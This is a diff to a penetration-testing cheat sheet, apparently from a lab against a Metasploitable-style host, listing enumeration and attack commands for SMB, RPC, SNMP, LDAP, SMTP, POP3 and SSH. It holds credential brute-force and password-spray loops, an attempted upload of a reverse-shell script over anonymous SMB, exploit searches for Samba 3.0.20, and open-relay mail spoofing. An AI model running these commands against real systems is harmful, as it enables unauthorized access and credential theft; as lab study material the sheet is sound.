@@ -228,31 +228,68 @@ SMB is a protocol used for file and printer sharing, as well as inter-process co
 **Example Nmap command to scan for SMB services:**
 
 ```bash
-bash
-CopyEdit
+
 sudo nmap -p 445 -sV -sC 192.168.188.131
 
 ```
+![image](https://github.com/user-attachments/assets/5f4b1ffc-baab-4de5-9c0f-dcb520401b1c)
+
 
 **Enumerating SMB Shares:**
 
 ```bash
-bash
-CopyEdit
+
 enum4linux -L -S 192.168.188.131
 smbclient -L 192.168.188.131 -N
 smbmap -H 192.168.188.131
+If you got user name and password:
+smbmap -H 192.168.188.131 -u "msfadmin" -p "msfadmin" -r tmp -A '.*' -q
 
 ```
 
 **Brute-forcing SMB credentials:**
 
 ```bash
-bash
-CopyEdit
+
 hydra -l admin -P /home/kali/pass.txt smb://192.168.188.131
+or
+netexec smb 192.168.188.131 -u admin -p /home/kali/pass.txt --continue-on-success
 
 ```
+![image](https://github.com/user-attachments/assets/c592d34d-613f-49b5-9a92-c3b8c951958a)
+
+**Exploit SMB:**
+Try to connect with no pass
+
+```jsx
+smbclient --no-pass //192.168.188.131/tmp
+```
+
+login as Anonymous:
+
+![image](https://github.com/user-attachments/assets/1e13a6c6-3293-4bf3-a01e-bb3303698da0)
+
+
+since we have smb access i tried:
+```jsx
+put rev.sh
+posix 
+chmod +x rev.sh
+chown Anonymous rev.sh
+open rev.sh
+```
+But didnt work:
+Failed to open file /rev.sh. NT_STATUS_ACCESS_DENIED
+![image](https://github.com/user-attachments/assets/4a71afb8-42f0-471e-bebb-bc7bc0a83107)
+
+SMB Version Samba 3.0.20 found, search for exploits:
+```bash
+searchsploit samba 3.0.20  
+locate multiple/remote/10095.txt
+cat /usr/share/exploitdb/exploits/multiple/remote/10095.txt
+```
+![image](https://github.com/user-attachments/assets/6603e3bd-03ea-4424-8d4c-f3aac3acdd52)
+
 
 ---
 
@@ -261,41 +298,140 @@ hydra -l admin -P /home/kali/pass.txt smb://192.168.188.131
 RPC allows a program on one computer to execute a procedure on another computer.
 
 **Enumerating with RPCClient:**
-
+**Connect to RPC server with an anonymous bind:**
 ```bash
-bash
-CopyEdit
-rpcclient 192.168.188.131 -U ''
+
+$ rpcclient -U "" -N <target>
 $> srvinfo
 $> enumdomusers
 
 ```
 
 This will provide information about the target system and its users.
+![image](https://github.com/user-attachments/assets/1a5d498c-8a6d-4a91-b017-69b62a6cb5e2)
 
+“RID are relative identifier to identify an object which will be in hexa decimal format”
+
+Query Domain information:
+![image](https://github.com/user-attachments/assets/d3e9af35-e0b2-4c72-b893-e7a24141b82a)
+
+
+**Enumerate Domain Users**
+
+```
+rpcclient $> enumdomusers
+user: [Administrator] rid:[0x1f4]
+...
+
+```
+
+**Enumerate Domain Groups**
+
+```
+rpcclient $> enumdomgroups
+group: [Domain Admins] rid:[0x200]
+...
+
+```
+
+**Query Group Information**
+
+```
+rpcclient $> querygroup 0x200
+Group Name:     Domain Admins
+...
+
+```
+
+**Query Group Membership**
+
+```
+rpcclient $> querygroupmem 0x200
+rid:[0x1f4]   attr:[0x7]
+...
+
+```
+
+**Query Specific User Information by RID**
+
+```
+rpcclient $> queryuser 0x1f4
+User name   :   Administrator
+...
+
+```
+
+**Get Domain Password Info**
+
+```
+rpcclient $> getdompwinfo
+min_password_length: 11
+password_properties: 0x00000000
+
+```
+
+**Get Domain User Password Info**
+
+```
+rpcclient $> getusrdompwinfo 0x1f4
+min_password_length: 11
+    &info.password_properties: 0x4b58bb34 (1264106292)
+    ...
+
+```
+
+**Password Spray Attack**
+
+The following script will iterate over usernames and passwords and try to execute "getusername". Watch out for "ACCOUNT_LOCKED" error messages.
+
+```
+TARGET=10.10.10.10;
+while read username; do
+  while read password; do
+    echo -n "[*] user: $username" && rpcclient -U "$username%$password" -c "getusername;quit" $TARGET | grep -v "NT_STATUS_ACCESS_DENIED";
+  done < /path/to/passwords.txt
+done < /path/to/usernames.txt
+```
+
+If a password is found, use it with smbclient to explore the SYSVOL:
+
+```
+$ smbclient -U "username%password" \\\\<target>\\SYSVOL
+Domain=[HOME] OS=[Windows Server 2008]
+...
+smb: \> ls
+...
+```
 ---
 
 ### **5. SNMP (Simple Network Management Protocol)**
 
 SNMP is used to manage and monitor network devices. It can be exploited if the community string is weak or known (like **public** or **private**).
+![image](https://github.com/user-attachments/assets/c4d02453-3331-4739-bf58-f38aea7a6133)
 
 **Example SNMP enumeration with `snmpcheck`:**
 
 ```bash
-bash
-CopyEdit
+
 snmpcheck -c public -h 192.168.188.131
 
 ```
+if community string was public try to connect with snmpcheck
+![image](https://github.com/user-attachments/assets/1eef5dc1-7a3e-40e9-9b37-ce2bfea237d9)
+
+try to use snmp walk
+![image](https://github.com/user-attachments/assets/3a136368-a50b-4fb4-a7dd-63d72ed69358)
 
 **Brute-forcing SNMP community strings:**
 
 ```bash
-bash
-CopyEdit
+
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.146.156
+or
+snmpwalk -v1 -c public 192.168.146.156 NET-SNMP-EXTEND-MIB :: nsExtendObjects
 
 ```
+https://hacktricks.boitatech.com.br/pentesting/pentesting-snmp/snmp-rce
 
 ---
 
@@ -306,8 +442,7 @@ LDAP is a protocol used to access and maintain directory information. It is comm
 **Enumerating LDAP:**
 
 ```bash
-bash
-CopyEdit
+
 ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com"
 
 ```
@@ -317,8 +452,7 @@ You can also enumerate users and gather information from LDAP directories.
 **Using Metasploit for LDAP enumeration:**
 
 ```bash
-bash
-CopyEdit
+
 msfconsole
 use auxiliary/gather/ldap_query
 set RHOSTS <IP>
@@ -336,8 +470,7 @@ SMTP is used for sending and receiving emails. It can be exploited in cases of m
 **Enumerating SMTP:**
 
 ```bash
-bash
-CopyEdit
+
 smtp-user-enum -M VRFY -U usernames.txt -t <IP>
 
 ```
@@ -347,8 +480,7 @@ This can be used to find valid email addresses on the target system.
 **Exploiting Open Relay (sending emails):**
 
 ```bash
-bash
-CopyEdit
+
 telnet <IP> 25
 HELO attacker.com
 MAIL FROM: attacker@attacker.com
@@ -359,3 +491,189 @@ This is a test email.
 .
 
 ```
+---
+### **8. POP3**
+
+**Post Office Protocol** \(**POP**\) is a type of computer networking and Internet standard **protocol** that extracts and retrieves email from a remote mail server for access by the host machine. **POP** is an application layer **protocol** in the OSI model that provides end users the ability to fetch and receive email \(from [here](https://www.techopedia.com/definition/5383/post-office-protocol-pop)\).
+
+The POP clients generally connect, retrieve all messages, store them on the client system, and delete them from the server. There are 3 versions of POP, but POP3 is the most used one.
+
+**Default ports:** 110, 995\(ssl\)
+
+```text
+PORT    STATE SERVICE
+110/tcp open  pop3
+```
+
+## Enumeration
+
+### Banner Grabbing
+
+```bash
+nc -nv <IP> 110
+openssl s_client -connect <IP>:995 -crlf -quiet
+```
+
+## Manual
+
+You can use the command `CAPA` to obtain the capabilities of the POP3 server.
+
+## Automated
+
+```bash
+nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -port <PORT> <IP> #All are default scripts
+```
+
+The `pop3-ntlm-info` plugin will return some "**sensitive**" data \(Windows versions\).
+
+### [POP3 bruteforce](../brute-force.md#pop)
+
+## POP syntax
+
+```bash
+POP commands:
+  USER uid           Log in as "uid"
+  PASS password      Substitue "password" for your actual password
+  STAT               List number of messages, total mailbox size
+  LIST               List messages and sizes
+  RETR n             Show message n
+  DELE n             Mark message n for deletion
+  RSET               Undo any changes
+  QUIT               Logout (expunges messages if no RSET)
+  TOP msg n          Show first n lines of message number msg
+  CAPA               Get capabilities
+```
+
+From [here](http://sunnyoasis.com/services/emailviatelnet.html)
+
+Example:
+
+```text
+root@kali:~# telnet $ip 110
+ +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
+ USER billydean    
+ +OK
+ PASS password
+ +OK Welcome billydean
+
+ list
+
+ +OK 2 1807
+ 1 786
+ 2 1021
+
+ retr 1
+
+ +OK Message follows
+ From: jamesbrown@motown.com
+ Dear Billy Dean,
+
+ Here is your login for remote desktop ... try not to forget it this time!
+ username: billydean
+ password: PA$$W0RD!Z
+```
+
+```
+
+### Identifying Issues
+
+- Clear-text authentication (no SSL/TLS).
+- Weak credentials (try common usernames/passwords).
+- Default or anonymous access.
+
+### Exploiting
+
+```bash
+
+# Manual login attempt
+telnet <IP> 110
+USER <username>
+PASS <password>
+
+# Hydra brute force
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt -s 110 -vV <IP> pop3
+
+```
+
+### References
+
+- HackTricks - POP3
+- POP3 RFC 1939
+---
+### **9. SSH**
+
+**Secure Shell (SSH)** is a cryptographic network protocol designed for secure communication over an unsecured network. It is primarily used for remote login and command-line execution, replacing older, less secure protocols like Telnet and rlogin
+https://www.ssh.com/academy/ssh/public-key-authentication
+
+## To create RSA SSH keys, generate a public/private key pair using
+
+```
+ssh-keygen
+```
+
+, copy the public key to the server's
+
+```
+~/.ssh/authorized_keys
+```
+
+file, and then log in using the private key.
+
+Here's a step-by-step guide:
+
+**1. Generate the SSH Key Pair:**
+
+- **Open your terminal**: on your local machine.
+- Run the `ssh-keygen` command:
+
+Code
+
+```jsx
+    ssh-keygen -t rsa -b 4096
+```
+
+- `t rsa`: Specifies the RSA algorithm.
+- `b 4096`: Specifies the key length (4096 bits is recommended).
+- You can also use `b 2048` for a shorter key length.
+- **Follow the prompts:**
+- Enter the path to save the key (default is `~/.ssh/id_rsa`).
+- Enter a passphrase for the private key (optional but recommended for security).
+- You'll have a public key (`~/.ssh/id_rsa.pub`) and a private key (`~/.ssh/id_rsa`).
+
+**2. Copy the Public Key to the Server:**
+
+Use the ssh-copy-id command.
+
+Code
+
+```jsx
+    ssh-copy-id -i ~/.ssh/id_rsa.pub user@server_ip_or_hostname
+```
+
+- Replace `user` with your username on the server.
+- Replace `server_ip_or_hostname` with the server's IP address or hostname.
+- **Alternatively, manually copy the public key:**
+- Read the contents of `~/.ssh/id_rsa.pub`.
+- SSH into the server.
+- Create the directory `~/.ssh` if it doesn't exist.
+- Create or edit the file `~/.ssh/authorized_keys`.
+- Append the contents of your public key to the `authorized_keys` file.
+- Change the permissions of `~/.ssh` to `700` and `authorized_keys` to `600`.
+
+Code
+
+```jsx
+    mkdir -p ~/.ssh    chmod 700 ~/.ssh   
+    touch ~/.ssh/authorized_keys    
+    chmod 600 ~/.ssh/authorized_keys    
+    cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+```
+
+**3. Log in with the Private Key:**
+
+- **Open your terminal**: on your local machine.
+- Use the `ssh` command with the `i` option:
+  ```jsx
+  ssh -i ~/.ssh/id_rsa user@server_ip_or_hostname
+  ```
+  ---
